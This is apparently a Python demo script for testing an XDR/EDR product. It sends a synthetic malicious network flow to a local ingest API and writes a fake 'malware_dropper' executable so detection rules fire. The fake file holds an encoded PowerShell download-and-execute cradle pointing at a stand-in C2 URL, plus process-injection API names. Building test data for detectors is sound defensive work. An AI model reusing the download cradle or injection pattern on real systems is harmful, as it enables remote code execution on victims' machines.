"""
simulate_attack_with_payload.py
===============================
Simulează un scenariu realist de atac:
1. Trimite un flux malițios către /api/ingest/ (atac de rețea pe port 443 / 80).
2. Simulează descărcarea unui payload executabil suspect în 'host_downloads/'.
"""

import os
import time
import requests

INGEST_URL = "http://127.0.0.1:8000/api/ingest/"
DOWNLOAD_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "host_downloads")


def main():
    print("=== [DEMO XDR] Declanșare Scenariu Atac Combinat ===")

    # 1. Trimitere vector de rețea suspect
    network_payload = {
        "src_ip": "192.168.1.188",
        "dst_ip": "10.0.0.5",
        "src_port": 49152,
        "dst_port": 443,
        "protocol": "TCP",
        "total_fwd_packets": 250,
        "fwd_packet_length_max": 1460.0,
        "flow_iat_mean": 12.5,
        "flow_iat_max": 45.0
    }

    print("\n[Faza 1] Generare trafic de atac în rețea (Brute Force / Exploit)...")
    try:
        r = requests.post(INGEST_URL, json=network_payload, timeout=5)
        print(f"-> Răspuns NIDS Ingest: {r.status_code} - Alertă generată cu succes.")
    except Exception as e:
        print(f"-> Eroare trimitere flux: {e}")

    time.sleep(1.5)

    # 2. Simulare scriere/descărcare binar malițios pe stație
    if not os.path.exists(DOWNLOAD_DIR):
        os.makedirs(DOWNLOAD_DIR)

    file_name = f"malware_dropper_{int(time.time())}.exe"
    file_path = os.path.join(DOWNLOAD_DIR, file_name)

    print(f"\n[Faza 2] Simulare descărcare payload pe stația victimă ({file_name})...")
    # Construim un conținut binar fictiv dar care conține semnături UPX și PowerShell ascuns pentru YARA
    fake_pe_content = (
        b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00"
        b"UPX0\x00\x00\x00UPX1\x00\x00\x00"
        b"powershell.exe -enc aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5n('http://c2-evil.com/gate.php')"
        b"VirtualAllocEx WriteProcessMemory CreateRemoteThread"
    )

    with open(file_path, "wb") as f:
        f.write(fake_pe_content)

    print(f"-> Binar salvat în {DOWNLOAD_DIR}. Agentul EDR ar trebui să-l intercepteze în < 1 secundă.")


if __name__ == '__main__':
    main()